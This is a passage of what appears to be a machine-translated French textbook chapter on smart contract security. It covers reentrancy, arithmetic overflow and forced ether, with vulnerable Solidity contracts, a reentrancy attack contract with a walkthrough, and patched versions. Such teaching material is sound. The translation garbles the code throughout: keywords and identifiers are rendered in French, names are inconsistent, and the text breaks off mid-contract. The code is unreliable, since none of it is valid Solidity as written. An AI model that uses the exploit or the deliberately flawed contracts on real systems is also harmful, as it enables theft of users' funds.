Sécurité des contrats intelligents

La sécurité est l'une des considérations les plus importantes lors de la rédaction de contrats intelligents. Dans le domaine de la programmation de contrats intelligents, les erreurs sont coûteuses et facilement exploitables. Dans ce chapitre, nous examinerons les meilleures pratiques de sécurité et les modèles de conception, ainsi que les «anti-modèles de sécurité», qui sont des pratiques et des modèles qui peuvent introduire des vulnérabilités dans nos contrats intelligents.

Comme avec d'autres programmes, un contrat intelligent exécutera exactement ce qui est écrit, ce qui n'est pas toujours ce que le programmeur avait prévu. De plus, tous les contrats intelligents sont publics et tout utilisateur peut interagir avec eux simplement en créant une transaction. Toute vulnérabilité peut être exploitée et les pertes sont presque toujours impossibles à récupérer. Il est donc essentiel de suivre les meilleures pratiques et d'utiliser des modèles de conception éprouvés.

Meilleures pratiques de sécurité

_La programmation défensive_ est un style de programmation particulièrement bien adapté aux contrats intelligents. Il met l'accent sur les éléments suivants, qui sont tous des pratiques exemplaires :

*Minimalisme/simplicité*

____
La complexité est l'ennemie de la sécurité. Plus le code est simple et moins il en fait, moins il y a de chances qu'un bogue ou un effet imprévu se produise. Lorsqu'ils s'engagent pour la première fois dans la programmation de contrats intelligents, les développeurs sont souvent tentés d'essayer d'écrire beaucoup de code. Au lieu de cela, vous devriez parcourir votre code de contrat intelligent et essayer de trouver des moyens d'en faire moins, avec moins de lignes de code, moins de complexité et moins de "fonctionnalités". Si quelqu'un vous dit que son projet a produit "des milliers de lignes de code" pour ses contrats intelligents, vous devez vous interroger sur la sécurité de ce projet. Plus simple est plus sûr.

*Réutilisation du code*

Essayez de ne pas réinventer la roue. S'il existe déjà une bibliothèque ou un contrat qui fait la plupart de ce dont vous avez besoin, réutilisez-le. Dans votre propre code, suivez le principe DRY : ne vous répétez pas. Si vous voyez un extrait de code répété plus d'une fois, demandez-vous s'il pourrait être écrit en tant que fonction ou bibliothèque et réutilisé. Le code qui a été largement utilisé et testé est probablement plus sécurisé que tout nouveau code que vous écrivez. Méfiez-vous du syndrome "Pas inventé ici", où vous êtes tenté d'"améliorer" une fonctionnalité ou un composant en le construisant à partir de zéro. Le risque de sécurité est souvent supérieur à la valeur d'amélioration.

*Qualité des codes*

Le code de contrat intelligent est impitoyable. Chaque bogue peut entraîner une perte monétaire. Vous ne devez pas traiter la programmation de contrats intelligents de la même manière que la programmation à usage général. Écrire des DApps dans Solidity n'est pas comme créer un widget Web en JavaScript. Vous devez plutôt appliquer des méthodologies d'ingénierie et de développement de logiciels rigoureuses, comme vous le feriez dans l'ingénierie aérospatiale ou dans toute discipline similaire impitoyable. Une fois que vous avez "lancé" votre code, vous ne pouvez pas faire grand-chose pour résoudre les problèmes.

*Lisibilité/auditabilité*

Votre code doit être clair et facile à comprendre. Plus c'est facile à lire, plus c'est facile à auditer. Les contrats intelligents sont publics, car tout le monde peut lire le bytecode et tout le monde peut le désosser. Par conséquent, il est avantageux de développer votre travail en public, en utilisant des méthodologies collaboratives et open source , pour tirer parti de la sagesse collective de la communauté des développeurs et bénéficier du plus grand dénominateur commun du développement open source. Vous devez écrire un code bien documenté et facile à lire, en suivant les conventions de style et de nommage qui font partie de la communauté Ethereum.

*Couverture de test*

Testez tout ce que vous pouvez. Les contrats intelligents s'exécutent dans un environnement d'exécution public, où n'importe qui peut les exécuter avec la contribution de son choix. Vous ne devez jamais supposer que l'entrée, telle que les arguments de fonction, est bien formée, correctement délimitée ou a un objectif bénin. Testez tous les arguments pour vous assurer qu'ils se situent dans les plages attendues et qu'ils sont correctement formatés avant d'autoriser la poursuite de l'exécution de votre code.
____

Risques de sécurité et anti-modèles

En tant que programmeur de contrats intelligents, vous devez être familiarisé avec les risques de sécurité les plus courants, afin de pouvoir détecter et éviter les modèles de programmation qui exposent vos contrats à ces risques. Dans les sections suivantes, nous examinerons différents risques de sécurité, des exemples de la façon dont les vulnérabilités peuvent survenir et des contre-mesures ou des solutions préventives qui peuvent être utilisées pour y faire face.

Réentrance

L'une des caractéristiques des contrats intelligents Ethereum est leur capacité à appeler et à utiliser le code d'autres contrats externes. Les contrats gèrent également généralement l'ether et, en tant que tels, envoient souvent de l'ether à diverses adresses d'utilisateurs externes. Ces opérations nécessitent que les contrats soumettent des appels externes. Ces appels externes peuvent être détournés par des attaquants, qui peuvent forcer les contrats à exécuter du code supplémentaire (via une fonction de secours ), y compris des rappels vers eux-mêmes. Des attaques de ce type ont été utilisées dans le tristement célèbre http://bit.ly/2DamSZT[+++piratage DAO+++] .

Pour en savoir plus sur les attaques par réentrance , voir Gus Guimareas's http://bit.ly/2zaqSEY[+++article de blog+++] sur le sujet et les http://bit.ly/2ERDMxV[+++meilleures pratiques Ethereum Smart Contract+++] .

La vulnérabilité

Ce type d'attaque peut se produire lorsqu'un contrat envoie de l'éther à une adresse inconnue. Un attaquant peut soigneusement construire un contrat à une adresse externe qui contient du code malveillant dans la fonction de secours. Ainsi, lorsqu'un contrat envoie de l'éther à cette adresse, il invoquera le code malveillant. Généralement , le code malveillant exécute une fonction sur le contrat vulnérable, effectuant des opérations non prévues par le développeur. Le terme « réentrance » vient du fait que le contrat externe malveillant appelle une fonction sur le contrat vulnérable et que le chemin d'exécution du code le « _réintègre_ ». Pour clarifier cela, considérons le simple contrat vulnérable dans file:///\\\\wsl.localhost\\Ubuntu-20.04\\home\\syr3fx\\Code\\github\\maitriser-ca\\LivreMaitriserEthereum\\adoc\\for_use_ethereumbook_09smart-contracts-securitytxt_fr_CA.html#etherstore_vulnerable[+++EtherStore.sol+++] , qui agit comme un coffre-fort Ethereum qui permet aux déposants de retirer seulement 1 ether par semaine.

_Exemple 1. EtherStore.sol_

contrat EtherStore \{

uint256 limite de retrait public = 1 éther ;

mappage ( adresse => uint256) public lastWithdrawTime ;

mapping( adresse => uint256) balances publiques ;

function depotFunds ( ) external payer \{

balances[ msg.sender ] += msg.value ;

}

fonction retireFunds (uint256 _ weiToWithdraw ) public \{

require(balances[ msg.sender ] >= _ weiToWithdraw );

// limite le retrait

require( _ weiToWithdraw <= removalLimit );

// limite le temps accordé pour se rétracter

require( now >= lastWithdrawTime [ msg.sender ] + 1 semaines);

require( msg.sender .call.value (_ weiToWithdraw )());

balances[ msg.sender ] -= _ weiToWithdraw ;

lastWithdrawTime [ msg.sender ] = maintenant ;

}

}

Ce contrat a deux fonctions publiques, depositFunds et removeFunds . La fonction de dépôt de fonds incrémente simplement le solde de l'expéditeur. La fonction de retrait de fonds permet à l'expéditeur de spécifier le montant de wei à retirer. Cette fonction est destinée à réussir uniquement si le montant demandé à retirer est inférieur à 1 ether et qu'aucun retrait n'a eu lieu la semaine dernière.

La vulnérabilité se trouve à la ligne 17, où le contrat envoie à l'utilisateur la quantité d'éther demandée. Considérez un attaquant qui a créé le contrat dans file:///\\\\wsl.localhost\\Ubuntu-20.04\\home\\syr3fx\\Code\\github\\maitriser-ca\\LivreMaitriserEthereum\\adoc\\for_use_ethereumbook_09smart-contracts-securitytxt_fr_CA.html#etherstore_attack[+++Attack.sol+++] .

_Exemple 2. Attaque.sol_

importer " EtherStore.sol " ;

contrat Attaque \{

EtherStore public etherStore ;

// initialise la variable etherStore avec l'adresse du contrat

constructeur ( adresse _ etherStoreAddress ) \{

etherStore = EtherStore (_ etherStoreAddress );

}

fonction attackEtherStore ( ) external payable \{

// attaque à l'éther le plus proche

require( msg.value >= 1 ether);

// envoie eth à la fonction de dépôt de fonds ( )

etherStore.depositFunds. valeur ( 1 éther)();

// lance la magie

etherStore.withdrawFunds (1 ether );

}

fonction collectEther ( ) public \{

msg.sender .transfer ( this.balance );

}

// fonction de secours - où la magie opère

fonction () payable \{

si ( etherStore.balance > 1 ether) \{

etherStore.withdrawFunds (1 ether );

}

}

}

Comment l'exploit peut-il se produire ? Tout d'abord, l'attaquant créerait le contrat malveillant (disons à l'adresse 0x0… ​123 ) avec l' adresse de contrat de l' EtherStore comme seul paramètre constructeur. Cela initialiserait et pointerait la variable publique etherStore vers le contrat à attaquer.

L'attaquant appellerait alors la fonction attackEtherStore , avec une certaine quantité d'éther supérieure ou égale à 1 - supposons 1 éther pour le moment. Dans cet exemple, nous supposerons également qu'un certain nombre d'autres utilisateurs ont déposé de l'ether dans ce contrat, de sorte que son solde actuel est de 10 ether . La suite sera alors se produisent :

[arabic]
. {blank}
+
____
_Attack.sol_ , ligne 15 : La fonction DepositFunds du contrat EtherStore sera appelée avec une msg.value de 1 ether (et beaucoup de gaz). L'expéditeur ( msg.sender ) sera le contrat malveillant ( 0x0… ​123 ). Ainsi , soldes[0x 0.. 123] = 1 éther .
____
. {blank}
+
____
_Attack.sol_ , ligne 17 : Le contrat malveillant va alors appeler la fonction retraitFunds du contrat EtherStore avec un paramètre de 1 ether . Cela satisfera à toutes les exigences (lignes 12 à 16 du contrat EtherStore ) car aucun retrait précédent n'a été effectué.
____
. {blank}
+
____
_EtherStore.sol_ , ligne 17 : Le contrat renverra 1 ether au contrat malveillant.
____
. {blank}
+
____
_Attack.sol_ , ligne 25 : Le paiement au contrat malveillant exécutera alors la fonction de secours.
____
. {blank}
+
____
_Attack.sol_ , ligne 26 : Le solde total du contrat EtherStore était de 10 ether et est maintenant de 9 ether , donc cette instruction if passe.
____
. {blank}
+
____
_Attack.sol_ , ligne 27 : La fonction de secours appelle l' EtherStore retireFunds fonctionne à nouveau et « réintègre » le contrat _EtherStore_ .
____
. {blank}
+
____
_EtherStore.sol_ , ligne 11 : Dans ce deuxième appel à removeFunds , le solde du contrat attaquant est toujours de 1 ether car la ligne 18 n'a pas encore été exécutée. Ainsi, nous avons toujours balances[0x 0.. 123] = 1 ether . C'est également le cas pour la variable lastWithdrawTime . Encore une fois , nous passer toutes les exigences .
____
. {blank}
+
____
_EtherStore.sol_ , ligne 17 : Le contrat attaquant retire 1 autre ether .
____
. {blank}
+
____
Répétez les étapes 4 à 8 jusqu'à ce qu'il ne soit plus le cas que EtherStore.balance > 1 , comme dicté par la ligne 26 dans _Attack.sol_ .
____
. {blank}
+
____
_Attack.sol_ , ligne 26 : Une fois qu'il reste 1 (ou moins) d'éther dans le contrat EtherStore , cette instruction if échouera. Cela permettra alors d'exécuter les lignes 18 et 19 du contrat EtherStore (pour chaque appel à la fonction removeFunds ).
____
. {blank}
+
____
_EtherStore.sol_ , lignes 18 et 19 : Les soldes et les mappages lastWithdrawTime seront définis et l'exécution se terminera.
____

Le résultat final est que l'attaquant a retiré tous les éthers sauf 1 du contrat EtherStore en une seule transaction.

Techniques préventives

Il existe un certain nombre de techniques courantes qui permettent d'éviter les vulnérabilités potentielles de réentrance dans les contrats intelligents. La première consiste à (dans la mesure du possible) utiliser la fonction de http://bit.ly/2Ogvnng[+++transfert+++] intégrée lors de l'envoi d'ether à des contrats externes. La fonction de transfert n'envoie que du gaz 2300 avec l'appel externe, ce qui n'est pas suffisant pour que l'adresse/le contrat de destination appelle un autre contrat (c'est-à-dire qu'il ressaisisse le contrat d'envoi).

La deuxième technique consiste à s'assurer que toute la logique qui modifie les variables d'état se produit avant que l'éther ne soit envoyé hors du contrat (ou de tout appel externe). Dans l' exemple EtherStore , les lignes 18 et 19 de _EtherStore.sol_ doivent être placées avant la ligne 17. Il est recommandé que tout code effectuant des appels externes à des adresses inconnues soit la dernière opération d'une fonction localisée ou d'un morceau de code exécuté. C'est ce qu'on appelle le http://bit.ly/2EVo70v[+++modèle vérifications-effets-interactions+++] .

Une troisième technique consiste à introduire un mutex, c'est-à-dire à ajouter une variable d'état qui verrouille le contrat pendant l'exécution du code, empêchant les appels réentrants .

L'application de toutes ces techniques (l'utilisation des trois n'est pas nécessaire, mais nous le faisons à des fins de démonstration) à _EtherStore.sol_ donne le contrat sans réentrance :

contrat EtherStore \{

// initialise le mutex

bool reEntrancyMutex = faux ;

uint256 limite de retrait public = 1 éther ;

mappage ( adresse => uint256) public lastWithdrawTime ;

mapping( adresse => uint256) balances publiques ;

function depotFunds ( ) external payer \{

balances[ msg.sender ] += msg.value ;

}

fonction retireFunds (uint256 _ weiToWithdraw ) public \{

nécessite (! reEntrancyMutex );

require(balances[ msg.sender ] >= _ weiToWithdraw );

// limite le retrait

require( _ weiToWithdraw <= removalLimit );

// limite le temps accordé pour se rétracter

require( now >= lastWithdrawTime [ msg.sender ] + 1 semaines);

balances[ msg.sender ] -= _ weiToWithdraw ;

lastWithdrawTime [ msg.sender ] = maintenant ;

// définit le mutex reEntrancy avant l'appel externe

reEntrancyMutex = vrai ;

msg.sender .transfer (_ weiToWithdraw );

// libère le mutex après l'appel externe

reEntrancyMutex = faux ;

}

}

Exemple concret : le DAO

L'attaque DAO (Decentralized Autonomous Organization) a été l'un des principaux piratages survenus au début du développement d'Ethereum. À l'époque, le contrat détenait plus de 150 millions de dollars. La réentrance a joué un rôle majeur dans l'attaque, qui a finalement conduit au hard fork qui a créé Ethereum Classic (ETC). Pour une bonne analyse de l'exploit DAO, voir http://bit.ly/2EQaLCI[+++http://bit.ly/2EQaLCI+++] . Plus d'informations sur l'historique du fork d'Ethereum, la chronologie du piratage DAO et la naissance d'ETC dans un hard fork peuvent être trouvées dans +++[+++ file:///\\wsl.localhost\Ubuntu-20.04\home\syr3fx\Code\github\maitriser-ca\LivreMaitriserEthereum\adoc\for_use_ethereumbook_09smart-contracts-securitytxt_fr_CA.html#ethereum_standards[+++ethereum_standards+++ +++]+++] .

Sur/sous-dépassement arithmétique

La machine virtuelle Ethereum spécifie des types de données de taille fixe pour les entiers. Cela signifie qu'une variable entière ne peut représenter qu'une certaine plage de nombres. Un uint8 , par exemple, ne peut stocker que des nombres dans la plage [0,255]. Essayer de stocker 256 dans un uint8 donnera 0 . Si l'on n'y prend pas garde, les variables de Solidity peuvent être exploitées si la saisie de l'utilisateur n'est pas cochée et si des calculs sont effectués qui aboutissent à des nombres qui se situent en dehors de la plage du type de données qui les stocke.

Pour en savoir plus sur les débordements arithmétiques, voir https://bit.ly/2nNLuOr[+++"Comment sécuriser vos contrats intelligents"+++] , https://bit.ly/2MOfBPv[+++Ethereum Smart Contract Best Practices+++] et https://bit.ly/2xvbx1M[+++"Ethereum, Solidity and integer overflows: Programming blockchains like 1970"+++] .

La vulnérabilité

Un débordement/sous-dépassement se produit lorsqu'une opération est effectuée qui nécessite une variable de taille fixe pour stocker un nombre (ou un élément de données) qui est en dehors de la plage du type de données de la variable.

Par exemple, soustraire 1 d'une variable uint8 (entier non signé de 8 bits, c'est-à-dire non négatif) dont la valeur est 0 donnera le nombre 255 . Il s'agit d'un _débordement_ . Nous avons attribué un nombre en dessous de la plage de uint8 , de sorte que le résultat _se termine_ et donne le plus grand nombre qu'un uint8 puisse stocker. De même, ajouter 2^8=256 à un uint8 laissera la variable inchangée, car nous avons enroulé autour de toute la longueur du uint . Deux analogies simples de ce comportement sont les odomètres dans les voitures, qui mesurent la distance parcourue (ils se réinitialisent à 000000, après que le plus grand nombre, c'est-à-dire 999999, est dépassé) et les fonctions mathématiques périodiques (l'ajout de 2 π à l'argument de sin laisse la valeur inchangée ).

L'ajout de nombres supérieurs à la plage du type de données est appelé un _débordement_ . Pour plus de clarté, ajouter 257 à un uint8 qui a actuellement une valeur de 0 se traduira par le nombre 1 . Il est parfois instructif de considérer les variables de taille fixe comme étant cycliques, où nous recommençons à partir de zéro si nous ajoutons des nombres au-dessus du plus grand nombre stocké possible, et commençons à compter à partir du plus grand nombre si nous soustrayons de zéro. Dans le cas des types int signés , qui _peuvent_ représenter des nombres négatifs, nous recommençons une fois que nous atteignons la plus grande valeur négative ; par exemple, si nous essayons de soustraire 1 à un int8 dont la valeur est -128 , nous obtiendrons 127 .

Ces types de pièges numériques permettent aux attaquants de mal utiliser le code et de créer des flux logiques inattendus. Par exemple, considérez le contrat TimeLock dans file:///\\wsl.localhost\Ubuntu-20.04\home\syr3fx\Code\github\maitriser-ca\LivreMaitriserEthereum\adoc\for_use_ethereumbook_09smart-contracts-securitytxt_fr_CA.html#timelock_sol_security[+++TimeLock.sol+++] .

_Exemple 3. TimeLock.sol_

contrat TimeLock \{

mapping( address => uint ) balances publiques ;

mapping( adresse => uint ) public lockTime ;

fonction caution( ) externe à payer \{

balances[ msg.sender ] += msg.value ;

lockTime [ msg.sender ] = maintenant + 1 semaines ;

}

fonction augmenterLockTime ( uint _ secondsToIncrease ) public \{

lockTime [ msg.sender ] += _ secondsToIncrease ;

}

fonction retirer( ) public \{

require(balances[ msg.sender ] > 0);

require( now > lockTime [ msg.sender ]);

soldes[ msg.expéditeur ] = 0 ;

msg.sender .transfer (solde);

}

}

Ce contrat est conçu pour agir comme un coffre-fort temporel : les utilisateurs peuvent déposer de l'éther dans le contrat et il y sera verrouillé pendant au moins une semaine. L'utilisateur peut prolonger le temps d'attente à plus d'une semaine s'il le souhaite, mais une fois déposé, l'utilisateur peut être sûr que son éther est verrouillé en toute sécurité pendant au moins une semaine, du moins c'est ce que prévoit ce contrat.

Dans le cas où un utilisateur est obligé de remettre sa clé privée, un contrat comme celui-ci peut être utile pour s'assurer que son ether est introuvable pendant une courte période. Mais si un utilisateur avait verrouillé 100 ether dans ce contrat et remis ses clés à un attaquant, l'attaquant pourrait utiliser un débordement pour recevoir l'ether, quel que soit le lockTime .

L'attaquant pourrait déterminer le lockTime actuel pour l'adresse pour laquelle il détient maintenant la clé (c'est une variable publique). Appelons cet userLockTime . Ils pourraient alors appeler la fonction raiseLockTime et passer en argument le nombre 2^256 - userLockTime . Ce nombre serait ajouté à l' userLockTime actuel et provoquerait un débordement, réinitialisant lockTime [ msg.sender ] à 0 . L'attaquant pourrait alors simplement appeler la fonction de retrait pour obtenir sa récompense.

Regardons un autre exemple ( +++exemple de vulnérabilité+++ file:///\\wsl.localhost\Ubuntu-20.04\home\syr3fx\Code\github\maitriser-ca\LivreMaitriserEthereum\adoc\for_use_ethereumbook_09smart-contracts-securitytxt_fr_CA.html#underflow_vulnerability_example_from_ethernaut_challenge[+++Underflow du+++ +++défi Ethernaut+++] ), celui-ci des https://github.com/OpenZeppelin/ethernaut[+++défis+++] +++Ethernaut+++ .

*ALERTE SPOIL:* _Si vous n'avez pas encore fait les défis Ethernaut , cela donne une solution à l'un des niveaux_ .

_Exemple 4. Exemple de vulnérabilité de débordement du défi Ethernaut_

pragma solidité ^0.4. 18;

Jeton de contrat \{

mapping( adresse => uint ) soldes ;

uint public totalSupply ;

fonction ( uint _ initialSupply ) \{

balances[ msg.sender ] = totalSupply = _ initialSupply ;

}

fonction transfert( adresse _to, uint _value) retours publics (bool) \{

require(balances[ msg.sender ] - _value >= 0);

balances[ msg.sender ] -= _value ;

soldes[_to] += _ valeur ;

retourner vrai ;

}

fonction balanceOf ( adresse _owner) constante publique renvoie ( uint balance) \{

retourner les soldes[_owner ] ;

}

}

Il s'agit d'un simple contrat de jeton qui utilise une fonction de transfert , permettant aux participants de déplacer leurs jetons. Pouvez-vous voir l'erreur dans ce contrat ?

La faille vient de la fonction de transfert . L'instruction require de la ligne 13 peut être contournée à l'aide d'un underflow. Considérez un utilisateur avec un solde nul. Ils pourraient appeler la fonction de transfert avec n'importe quelle _value différente de zéro et passer l'instruction require à la ligne 13. En effet, balances[ msg.sender ] est égal à 0 (et a uint256 ), donc la soustraction de tout montant positif (à l'exception de 2^256 ) entraînera un nombre positif, comme décrit précédemment. Ceci est également vrai pour la ligne 14, où le solde sera crédité d'un nombre positif. Ainsi, dans cet exemple, un attaquant peut obtenir des jetons gratuits en raison d'une vulnérabilité de débordement.

Techniques préventives

La technique conventionnelle actuelle pour se prémunir contre les vulnérabilités de sous-dépassement/débordement consiste à utiliser ou à créer des bibliothèques mathématiques qui remplacent les opérateurs mathématiques standard d' addition, de soustraction et de multiplication (la division est exclue car elle ne provoque pas de dépassement/sous-dépassement et l'EVM revient à la division par 0 ).

https://github.com/OpenZeppelin/openzeppelin-solidity[+++OpenZeppelin+++] a fait un excellent travail de création et d'audit de bibliothèques sécurisées pour la communauté Ethereum. En particulier, son La http://bit.ly/2ABhb4l[+++bibliothèque+++] +++SafeMath+++ peut être utilisée pour éviter les vulnérabilités de sous/débordement.

Pour montrer comment ces bibliothèques sont utilisées dans Solidity, corrigeons le contrat TimeLock à l'aide de la bibliothèque SafeMath . La version sans débordement du contrat est :

bibliothèque SafeMath \{

fonction mul ( uint256 a, uint256 b) retour pur interne (uint256) \{

si (un == 0) \{

renvoie 0 ;

}

uint256 c = un * b;

assert( c / a == b);

retour c;

}

fonction div( uint256 a, uint256 b) retour pur interne (uint256) \{

// assert( b > 0); // Solidity lance automatiquement lors de la division par 0

uint256 c = un / b ;

// assert( a == b * c + a % b); // Cela vaut dans tous les cas

retour c;

}

function sub( uint256 a, uint256 b) retour pur interne (uint256) \{

assert( b <= a);

retourner a - b ;

}

function add( uint256 a, uint256 b) retour pur interne (uint256) \{

uint256 c = a + b ;

assert( c >= a);

retour c;

}

}

contrat TimeLock \{

en utilisant SafeMath pour uint ; // utilise la bibliothèque pour le type uint

mapping( adresse => uint256) balances publiques ;

mapping( adresse => uint256) public lockTime ;

fonction caution( ) externe à payer \{

balances[ msg.sender ] = balances[ msg.sender ].add( msg.value );

lockTime [ msg.sender ] = now.add (1 semaines);

}

fonction augmenterLockTime ( uint256 _ secondsToIncrease ) public \{

lockTime [ msg.sender ] = lockTime [ msg.sender ].add(_ secondsToIncrease );

}

fonction retirer( ) public \{

require(balances[ msg.sender ] > 0);

require( now > lockTime [ msg.sender ]);

soldes[ msg.expéditeur ] = 0 ;

msg.sender .transfer (solde);

}

}

Notez que toutes les opérations mathématiques standard ont été remplacées par celles définies dans la bibliothèque SafeMath . Le contrat TimeLock n'effectue plus aucune opération capable de sous/débordement.

Exemples concrets : PoWHC et débordement de transfert par lots (CVE-2018–10299)

Proof of Weak Hands Coin ( PoWHC ), conçu à l'origine comme une sorte de blague, était un stratagème de Ponzi écrit par un collectif Internet. Malheureusement , il semble que l'auteur ou les auteurs du contrat n'avaient pas vu de débordements/sous-verses auparavant, et par conséquent 866 éthers ont été libérés de son contrat. Eric Banisadr donne un bon aperçu de la façon dont le débordement s'est produit (ce qui n'est pas trop différent du défi Ethernaut décrit précédemment) dans son https://bit.ly/2wrxIFJ[+++article de blog+++] sur l'événement.

http://bit.ly/2CUf7WG[+++Un autre exemple+++] provient de l'implémentation d'une fonction batchTransfer ( ) dans un groupe de contrats de jetons ERC20. L'implémentation contenait une vulnérabilité de débordement ; vous pouvez lire les détails dans le https://bit.ly/2HDlIs8[+++compte+++] +++de PeckShield+++ .

Éther inattendu

En règle générale, lorsque Ether est envoyé à un contrat, il doit exécuter soit la fonction de secours, soit une autre fonction définie dans le contrat. Il y a deux exceptions à cela, où l'éther peut exister dans un contrat sans avoir exécuté de code. Les contrats qui reposent sur l'exécution de code pour tout l'éther qui leur est envoyé peuvent être vulnérables aux attaques où l'éther est envoyé de force.

Pour en savoir plus à ce sujet, consultez https://bit.ly/2MR8Gp0[+++« Comment sécuriser vos contrats intelligents »+++] et http://bit.ly/2RjXmUWl[+++« Modèles de sécurité solides – Forcer Ether à un contrat »+++] .

La vulnérabilité

Une technique de programmation défensive courante qui est utile pour appliquer des transitions d'état correctes ou valider des opérations est _la vérification invariante_ . Cette technique consiste à définir un ensemble d'invariants (métriques ou paramètres qui ne doivent pas changer) et à vérifier qu'ils restent inchangés après une (ou plusieurs) opération(s). C'est généralement une bonne conception, à condition que les invariants vérifiés soient en fait des invariants. Un exemple d'invariant est l' offre totale d'une émission fixe http://bit.ly/2CUf7WG[+++Jeton ERC20+++] . Comme aucune fonction ne doit modifier cet invariant, on pourrait ajouter une vérification à la fonction de transfert qui s'assure que le totalSupply reste inchangé, pour garantir que la fonction fonctionne comme prévu.

En particulier, il existe un invariant apparent qu'il peut être tentant d'utiliser mais qui peut en fait être manipulé par des utilisateurs externes (quelles que soient les règles mises en place dans le smart contract). Il s'agit de l'éther actuel stocké dans le contrat. Souvent, lorsque les développeurs apprennent Solidity pour la première fois , ils ont l'idée fausse qu'un contrat ne peut accepter ou obtenir de l'éther que via des fonctions payantes. Cette idée fausse peut conduire à des contrats qui contiennent de fausses hypothèses sur l'équilibre de l'éther, ce qui peut entraîner une série de vulnérabilités. La preuve irréfutable de cette vulnérabilité est l'utilisation (incorrecte) de this.balance .

Il existe deux manières d'envoyer (de force) de l'éther à un contrat sans utiliser de fonction payante ni exécuter de code sur le contrat :

*Autodestruction/suicide*

____
Tout contrat est capable d' implémenter la http://bit.ly/2RovrDf[+++fonction d'+++] +++autodestruction+++ , qui supprime tout le bytecode de l'adresse du contrat et envoie tout l'éther qui y est stocké à l'adresse spécifiée par le paramètre. Si cette adresse spécifiée est également un contrat, aucune fonction (y compris la fonction de secours) n'est appelée. Par conséquent, la fonction d'autodestruction peut être utilisée pour envoyer de force de l'éther à n'importe quel contrat, quel que soit le code pouvant exister dans le contrat, même les contrats sans fonctions payantes. Cela signifie que tout attaquant peut créer un contrat avec une fonction d' autodestruction , lui envoyer de l'ether, appeler l' autodestruction (cible) et forcer l'ether à être envoyé à un contrat cible . Martin Swende a un excellent http://bit.ly/2OfLukM[+++article de blog+++] décrivant certaines bizarreries de l'opcode d'autodestruction (Quirk # 2) ainsi qu'un compte rendu de la façon dont les nœuds clients vérifiaient des invariants incorrects, ce qui aurait pu conduire à un crash plutôt catastrophique du réseau Ethereum.

*Éther pré-envoyé*

Une autre façon d'intégrer de l'éther dans un contrat consiste à précharger l'adresse du contrat avec de l'éther. Les adresses de contrat sont déterministes - en fait, l'adresse est calculée à partir du hachage Keccak-256 (généralement synonyme de SHA-3) de l'adresse créant le contrat et du nonce de transaction qui crée le contrat. Plus précisément, il se présente sous la forme address = sha3( rlp.encode ([ account_address,transaction_nonce ])) (voir la discussion d'Adrian Manning sur http://bit.ly/2EPj5Tq[+++"Keyless Ether"+++] pour quelques cas d'utilisation amusants). Cela signifie que n'importe qui peut calculer quelle sera l'adresse d'un contrat avant sa création et envoyer de l'éther à cette adresse. Lorsque le contrat est créé, il aura un solde d'éther non nul.
____

Explorons quelques pièges qui peuvent survenir compte tenu de ces connaissances. Considérez le contrat trop simple dans file:///\\wsl.localhost\Ubuntu-20.04\home\syr3fx\Code\github\maitriser-ca\LivreMaitriserEthereum\adoc\for_use_ethereumbook_09smart-contracts-securitytxt_fr_CA.html#etherGame_security[+++EtherGame.sol+++] .

_Exemple 5. EtherGame.sol_

contrat EtherGame \{

paiement public uintMileStone1 = 3 éther ;

uint public mileStone1Reward = 2 éther ;

paiement public uintMileStone2 = 5 éther ;

uint public mileStone2Reward = 3 éther ;

uint public finalMileStone = 10 éther ;

uint public finalReward = 5 éther ;

mappage ( adresse => uint ) rachetableEther ;

// Les utilisateurs paient 0,5 éther. À des étapes spécifiques, créditez leurs comptes.

fonction jouer( ) externe payable \{

require( msg.value == 0,5 éther); // chaque jeu est de 0,5 éther

uint currentBalance = this.balance + msg.value ;

// s'assure qu'il n'y a plus de joueurs après la fin du jeu

require( currentBalance <= finalMileStone );

// si à un jalon, créditer le compte du joueur

si ( soldeactuel == payoutMileStone1) \{

échangeableEther [ msg.sender ] += mileStone1Reward ;

}

sinon si ( soldeactuel == payoutMileStone2) \{

échangeableEther [ msg.sender ] += mileStone2Reward ;

}

sinon si ( balanceactuelle == pierreMilefinale ) \{

rachetableEther [ msg.sender ] += finalReward ;

}

retourner;

}

fonction réclamationrécompense ( ) public \{

// s'assure que le jeu est terminé

nécessite( this.balance == finalMileStone );

// s'assure qu'il y a une récompense à donner

require ( redevableEther [ msg.sender ] > 0);

rachetableEther [ msg.expéditeur ] = 0 ;

msg.sender .transfer ( transferValue );

}

}

Ce contrat représente un jeu simple (qui impliquerait naturellement des conditions de course) où les joueurs envoient 0,5 éther au contrat dans l'espoir d'être le joueur qui atteint l'un des trois jalons en premier. Les jalons sont libellés en éther. Le premier à atteindre le jalon peut réclamer une partie de l'éther à la fin de la partie. Le jeu se termine lorsque le dernier jalon (10 éther) est atteint; les utilisateurs peuvent ensuite réclamer leurs récompenses.

Les problèmes avec le contrat EtherGame proviennent de la mauvaise utilisation de this.balance dans les deux lignes 14 (et par association 16) et 32. Un attaquant malicieux pourrait envoyer de force une petite quantité d'éther, disons 0,1 éther, via la fonction d'autodestruction ( discuté plus tôt) pour empêcher tout futur joueur d'atteindre un jalon. this.balance ne sera jamais un multiple de 0,5 éther grâce à cette contribution de 0,1 éther, car tous les joueurs légitimes ne peuvent envoyer que des incréments de 0,5 éther. Cela empêche toutes les conditions if des lignes 18, 21 et 24 d'être vraies.

Pire encore, un attaquant vengeur qui a raté un jalon pourrait envoyer de force 10 éthers (ou une quantité équivalente d'éthers qui pousse le solde du contrat au-dessus du finalMileStone ), ce qui verrouillerait toutes les récompenses dans le contrat pour toujours. En effet, la fonction claimReward sera toujours rétablie, en raison de l'exigence à la ligne 32 (c'est-à-dire parce que this.balance est supérieur à finalMileStone ).

Techniques préventives

Ce type de vulnérabilité provient généralement d'une mauvaise utilisation de this.balance . La logique contractuelle, dans la mesure du possible, doit éviter de dépendre des valeurs exactes du solde du contrat, car elle peut être artificiellement manipulée. Si vous appliquez une logique basée sur this.balance , vous devez faire face à des soldes inattendus.

Si des valeurs exactes d'éther déposé sont requises, une variable auto-définie doit être utilisée qui est incrémentée dans les fonctions payables, pour suivre en toute sécurité l'éther déposé. Cette variable ne sera pas influencée par l'éther forcé envoyé via un appel d' autodestruction .

Dans cet esprit, une version corrigée du contrat EtherGame pourrait ressembler à :

contrat EtherGame \{

paiement public uintMileStone1 = 3 éther ;

uint public mileStone1Reward = 2 éther ;

paiement public uintMileStone2 = 5 éther ;

uint public mileStone2Reward = 3 éther ;

uint public finalMileStone = 10 éther ;

uint public finalReward = 5 éther ;

uint public déposéWei ;

mappage (adresse => uint ) rachetableEther ;

fonction jouer( ) externe payable \{

require( msg.value == 0,5 éther);

